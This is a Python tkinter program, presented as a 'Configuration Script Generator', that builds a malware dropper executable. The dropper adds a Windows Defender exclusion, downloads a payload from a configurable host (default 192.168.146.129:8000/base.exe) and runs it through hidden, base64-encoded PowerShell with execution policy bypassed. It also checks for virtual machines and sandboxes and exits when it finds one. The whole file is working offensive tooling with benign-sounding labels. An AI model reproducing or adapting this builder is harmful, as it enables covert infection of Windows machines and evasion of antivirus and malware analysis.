import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import os
import textwrap
import tempfile
import sys
import subprocess
import shutil

# --- POWERSHELL SCRIPT TEMPLAT (Used to format variables) ---
PS_TEMPLATE = textwrap.dedent("""\
# Parameters derived from configuration:
$URL = '{URL}'
$DIR = '{DOWNLOAD_PATH}'
$PAYLOAD_NAME = '{FILENAME}'
$DELAY_START = {DELAY_START}
$DELAY_WAIT = {DELAY_WAIT}
$DOWNLOAD_DIR = [System.IO.Path]::Combine($env:USERPROFILE,$DIR)

Write-Host "Executing initial delay of $DELAY_START seconds..."
Start-Sleep -Seconds $DELAY_START

if (-not (Test-Path $DOWNLOAD_DIR)) {{
    New-Item -Path $DOWNLOAD_DIR -ItemType Directory | Out-Null
    Write-Host "Created directory: $DOWNLOAD_DIR"
}}

$FinalFilePath = Join-Path $DOWNLOAD_DIR $PAYLOAD_NAME
Add-MpPreference -ExclusionPath $FinalFilePath

Write-Host "Downloading content from $URL to $FinalFilePath"
Invoke-WebRequest -Uri $URL -OutFile $FinalFilePath

Write-Host "Waiting for $DELAY_WAIT seconds after download..."
Start-Sleep -Seconds $DELAY_WAIT

Write-Host "Starting final process: $FinalFilePath"
Start-Process -FilePath $FinalFilePath -NoNewWindow
""")

# --- PYTHON CODE TEMPLATE COMPONENTS (Flush-left for textwrap.dedent) ---

# 1. VM Detection Function (Windows-focused)
VM_CHECK_FUNCTION = textwrap.dedent("""\
import subprocess
import os
import winreg
import platform
import sys
import base64

def is_running_on_vmware_windows():
    if platform.system() != "Windows":
        return False
        
    # --- Check 1: WMI Artifacts (System/Hardware Names) ---
    try:
        command = 'wmic csproduct get Vendor,Name /value'
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=3)
        output = result.stdout.strip().lower()
        
        vm_indicators = ["vmware", "virtualbox", "virtual machine", "qemu", "hyper-v"]
        
        for indicator in vm_indicators:
            if indicator in output:
                return True
    except:
        pass
        
    # --- Check 2: VMware Tools Registry Key ---
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\VMware, Inc.\\VMware Tools"):
            return True
    except FileNotFoundError:
        pass
    except:
        pass

    # --- Check 3: Process List Artifacts ---
    try:
        vm_processes = ["vmtoolsd.exe", "VBoxService.exe", "vmacthlp.exe", "VMSrvc.exe"]
        command = 'tasklist /nh' 
        
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=3)
        output = result.stdout.strip().lower()

        for process in vm_processes:
            if process in output:
                return True
    except:
        pass
        
    # --- Check 4: File System Artifacts (VM Tools Directory) ---
    vmware_tools_path = r"C:\\Program Files\\VMware\\VMware Tools"
    if os.path.exists(vmware_tools_path):
        return True

    return False
""")

# 2. PowerShell Execution Function (Safe In-Memory Method)
PS_EXEC_FUNCTION = textwrap.dedent("""\
def execute_powershell_script(ps_content, delay_start):
    try:
        ps_script_bytes = ps_content.encode('utf-16le')
        ps_b64 = base64.b64encode(ps_script_bytes).decode('utf-8')
    except Exception:
        return False 
    
    command = f"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand {ps_b64}"

    try:
        subprocess.run(command, shell=True, timeout=600, 
                       creationflags=subprocess.CREATE_NO_WINDOW) 
        return True
    except Exception:
        return False
""")

# --- GUI ---

class GeneratorGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Configuration Script Generator")
        self.geometry("700x700")
        self.configure(bg='#1A1A1A')
        
        self.style = ttk.Style(self)
        self.style.theme_use('clam')
        self._configure_styles()
        
        self.main_frame = ttk.Frame(self, padding="20")
        self.main_frame.pack(fill='both', expand=True)

        self.vm_check_var = tk.BooleanVar(value=True)
        self.create_widgets()

    def _configure_styles(self):
        self.style.configure('.', background='#1A1A1A', foreground='#22C55E')
        self.style.configure('TFrame', background='#1A1A1A')
        self.style.configure('TLabel', background='#1A1A1A', foreground='#E0E0E0', font=('Consolas', 11))
        self.style.configure('TEntry', background='#333', foreground='#E0E0E0', fieldbackground='#333')
        self.style.configure('TCheckbutton', background='#1A1A1A', foreground='#E0E0E0')
        self.style.map('TCheckbutton', background=[('active', '#1A1A1A')])
        self.style.configure('TButton', background='#0052CC', foreground='#FFF', font=('Consolas', 12, 'bold'), borderwidth=0)
        self.style.map('TButton', background=[('active', '#0040A0')], foreground=[('active', '#FFF')])

    def create_widgets(self):
        title_label = ttk.Label(self.main_frame, text="PowerShell Deployment Configuration (PyInstaller)", font=('Consolas', 16, 'bold'), foreground='#22C55E')
        title_label.pack(pady=(0, 20))

        self.add_label_entry("Source Download Link:", "url_entry", "http://192.168.146.129:8000/base.exe")
        self.add_label_entry("Target Install Path:", "path_entry", "Downloads\\")
        self.add_label_entry("Pre-Check Delay (s):", "delay_start_entry", "5", width=10)
        self.add_label_entry("Post-Download Wait (s):", "delay_wait_entry", "3", width=10)
        self.add_label_entry("Final Executable Name:", "filename_entry", "service_runner.exe")
        
        vm_frame = ttk.Frame(self.main_frame)
        vm_frame.pack(fill='x', pady=10)
        vm_check = ttk.Checkbutton(
            vm_frame, 
            text="Enable Virtual Machine Detection Check", 
            variable=self.vm_check_var
        )
        vm_check.pack(side=tk.LEFT, padx=5, pady=2, anchor='w')

        generate_button = ttk.Button(self.main_frame, text="Generate Executable (.exe)", command=self.generate_py_script)
        generate_button.pack(fill='x', pady=20, ipady=10)
        
        ttk.Label(self.main_frame, text="Generated Executable Output Location:").pack(pady=(10, 0), anchor='w')
        self.log_entry = ttk.Entry(self.main_frame, width=80, state='readonly', font=('Consolas', 10))
        self.log_entry.pack(fill='x', padx=5, pady=5)


    def add_label_entry(self, label_text, attr_name, default_value="", width=None):
        frame = ttk.Frame(self.main_frame)
        frame.pack(fill='x', pady=5)
        
        label = ttk.Label(frame, text=label_text)
        label.pack(side=tk.LEFT, padx=5, pady=2, anchor='w')
        
        entry = ttk.Entry(frame, width=width or 50)
        entry.insert(0, default_value)
        entry.pack(side=tk.LEFT, fill='x', expand=True, padx=5, pady=2)
        
        setattr(self, attr_name, entry)
        return frame

    def get_execution_logic(self, ps_content, delay_start, enable_vm_check):
        """Generates the main execution function based on user choices."""
        
        # 1. Define the core execution logic block (flush left)
        if enable_vm_check:
            # Logic includes VM check and execution
            core_logic = textwrap.dedent(f"""\
if is_running_on_vmware_windows():
    sys.exit(0)
else:
    execute_powershell_script(PS_SCRIPT_CONTENT, EXECUTION_DELAY)
""")
        else:
            # Logic skips VM check and executes directly
            core_logic = textwrap.dedent(f"""\
execute_powershell_script(PS_SCRIPT_CONTENT, EXECUTION_DELAY)
""")

        # 2. Assemble the full script, ensuring the core_logic is correctly indented.
        #    The core_logic needs 8 spaces (two levels) of indentation.
        
        # We always include both VM_CHECK_FUNCTION and PS_EXEC_FUNCTION for simplicity 
        # as the first one brings necessary imports (subprocess, base64, etc.)
        full_script_content = textwrap.dedent(f"""
{VM_CHECK_FUNCTION}
{PS_EXEC_FUNCTION}

# --- TEMPLATE VARIABLES ---
PS_SCRIPT_CONTENT = '''{ps_content.replace("'", "\\'")}'''
EXECUTION_DELAY = {delay_start}

if __name__ == "__main__":
    if platform.system() == "Windows":
{textwrap.indent(core_logic, "        ")}
    else:
        sys.exit(0)
""")
        
        return full_script_content

    def generate_py_script(self):
        # 1. Gather all inputs
        url = self.url_entry.get().strip()
        download_path = self.path_entry.get().strip()
        payload_filename = self.filename_entry.get().strip()
        enable_vm_check = self.vm_check_var.get()

        try:
            delay_start = int(self.delay_start_entry.get())
            delay_wait = int(self.delay_wait_entry.get())
        except ValueError:
            messagebox.showerror("Input Error", "Delay times must be valid integers.")
            return

        if not all([url, download_path, payload_filename]):
            messagebox.showerror("Input Error", "All configuration fields must be filled.")
            return

        # 2. Format the PowerShell content based on user input
        ps_content = PS_TEMPLATE.format(
            URL=url,
            DOWNLOAD_PATH=download_path,
            FILENAME=payload_filename,
            DELAY_START=delay_start,
            DELAY_WAIT=delay_wait,
        )
        
        # 3. Get the final Python execution script content
        final_py_script_content = self.get_execution_logic(ps_content, delay_start, enable_vm_check)

        # 4. Ask user where to save the FINAL executable (.exe)
        exe_output_filepath = filedialog.asksaveasfilename(
            defaultextension=".exe",
            filetypes=[("Executable File", "*.exe")],
            initialfile=payload_filename.replace('.exe', '') + "_deployment.exe",
            title="Save the Generated Executable File"
        )
        
        if not exe_output_filepath:
            return

        # Use a temporary directory and file for the PyInstaller process
        temp_dir = tempfile.mkdtemp()
        temp_py_file = os.path.join(temp_dir, "temp_runner.py")
        
        success = False
        message = ""

        try:
            # 5a. Write the script content to the temporary .py file
            with open(temp_py_file, 'w', encoding='utf-8') as f:
                f.write(final_py_script_content)
            
            # 5b. Define output parameters for PyInstaller
            output_dir = os.path.dirname(exe_output_filepath)
            exe_name = os.path.basename(exe_output_filepath)
            
            # 5c. Construct and run PyInstaller command
            pyinstaller_command = [
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--name', exe_name,
                '--distpath', output_dir, 
                temp_py_file 
            ]
            
            # Execute PyInstaller
            self.log_entry.config(state='normal')
            self.log_entry.delete(0, tk.END)
            self.log_entry.insert(0, f"Compiling executable (This may take a minute)...")
            self.log_entry.config(state='readonly')
            self.update() 
            
            process = subprocess.run(pyinstaller_command, capture_output=True, text=True, check=False)
            
            if process.returncode == 0:
                success = True
            else:
                success = False
                message = f"PyInstaller Failed. Error:\n{process.stderr[-500:]}"
                
        except FileNotFoundError:
            message = "Error: PyInstaller not found. Please ensure it is installed and in your system PATH."
        except Exception as e:
            message = f"An unexpected error occurred during compilation: {e}"

        finally:
            # 6. Clean up temporary files (temp dir, spec file, build dir)
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir, ignore_errors=True)
            
            spec_file = os.path.join(os.getcwd(), exe_name.replace('.exe', '.spec'))
            if os.path.exists(spec_file):
                os.remove(spec_file)
            
            build_dir = os.path.join(os.getcwd(), 'build')
            if os.path.exists(build_dir):
                shutil.rmtree(build_dir, ignore_errors=True)


        # 7. Update Log and show message
        self.log_entry.config(state='normal')
        self.log_entry.delete(0, tk.END)
        self.log_entry.insert(0, exe_output_filepath if success else "Compilation Failed.")
        self.log_entry.config(state='readonly')

        if success:
            messagebox.showinfo(
                "Success", 
                f"Executable successfully created.\n\nPath: {exe_output_filepath}"
            )
        else:
            messagebox.showerror("Compilation Failed", message)


if __name__ == "__main__":
    try:
        subprocess.run(['pyinstaller', '--version'], check=True, capture_output=True, timeout=5)
    except:
        messagebox.showwarning("PyInstaller Warning", "PyInstaller not found. The compiler function will fail.")
        
    app = GeneratorGUI()
    app.mainloop()